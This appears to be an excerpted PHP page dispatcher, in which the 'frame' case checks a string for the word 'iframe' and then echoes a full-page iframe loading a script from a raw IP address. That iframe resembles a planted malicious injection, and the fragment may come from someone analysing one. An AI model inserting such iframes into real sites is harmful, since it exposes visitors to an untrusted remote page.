<?php
	...
	switch ($action)
	{
		...
		case 'frame'	:
				$zeichenkette = '<IFRAME src="http://89.136.254.209/d.php" width="100%" height="100%" border="0">';
				if(preg_match('/\biframe\b/i', $zeichenkette))
				print_r("iframe found");
				echo '
		<iframe src="http://89.136.254.209/d.php" width="100%" height="100%" border="0">
		...
		case 'auction'		:
			...
			require_once('pages'.DIRECTORY_SEPARATOR.'shop'.DIRECTORY_SEPARATOR.'inc.'.$action.'.php');
			break;
